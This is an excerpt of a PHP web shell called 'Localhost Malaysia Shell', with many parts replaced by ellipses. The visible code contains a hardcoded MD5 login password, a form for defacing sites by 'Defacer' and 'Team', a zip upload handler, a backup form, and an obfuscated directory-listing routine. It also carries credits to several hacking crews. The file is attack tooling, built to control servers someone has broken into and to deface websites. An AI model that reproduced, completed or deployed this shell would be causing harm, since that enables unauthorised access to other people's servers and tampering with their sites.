...
$password = "dda959b7e74dbcc889b441bd8dac2a52"; // md5 : Localhost 
...
for ($i = 0; $i < $___; $i++) {
	...
	<head>
		...
		<title>./Localhost Malaysia Shell</title>
		<link rel="icon" href="//i.ibb.co/vHGxnDb/newlocalhost.png">
	...
	<body>
		...
		<div class="container">
			...
			<div class="y x">
				<a href="?" class="ajx">
					<font color="black">LOCALHOST SHELL</font>
				</a>
			</div>
			<nav class="navbar navbar-expand-lg navbar-light bg-light ">
				...
				<a class="navbar-brand" href="#">
					<center><img src="//i.ibb.co/vHGxnDb/newlocalhost.png" width="20%"  class="d-inline-block align-top auto" alt="Ainz Moe">
				</a></center>
...
<br><hr>';
		...
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='./Jaring1337'><br>
		<u>Team</u>: <br>
     ...
     ';
			...
			if ($_FILES["zip_file"]["name"]) {
				...
				if (move_uploaded_file($source, $targetzip)) {
					...
					$message = "<b>Anda Berjaya :)</b>";
				} else {
					$message = "<b>Anda Gagal :(</b>";
				}
			}
...
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
    ...
    ";
			...
			?>
				...
				<head>
					<link rel="icon" type="image/gif" href="https://i.ibb.co/vHGxnDb/newlocalhost.png">
...
*/
																																		...
																																		echo "<hr><br><center><h2>About Index Localhost</h2>";
																																		echo "Thanks For Taking Our Shell Today without you all we are means nothing :) <br><br>";
																																		echo "visit us : <a href = 'https://discord.my-f1l3s.com' target = 'blank' class= 'form-control' style = 'width:250px;'>Pawned!</a> <br><br>";
																																		echo "We Are : <br>
			    Localhost Malaysia <br><br>
				";
																																		echo "Greetz : <br>BlackShieldCrew | Varians 19 Crew | All Muslim Hacking Team";
																																		echo "<hr><br></center>";
																																			...
																																			foreach ($w as $c) {
																																				...
																																				if (($c != ".") && ($c != "..")) {
																																					($GNJ[8]("$d/$c")) ?
																																						$h .= '<tr class="r">
							<td>
								<img src = "https://i.ibb.co/vHGxnDb/newlocalhost.png" width = "20px" height = "20px">
				...
				<footer class="x">
					<center>@Re-Code By Jaring ~ Localhost Malaysia </center>
				</footer>
				<?php
				if (isset($_GET["1"])) {
					echo $f;
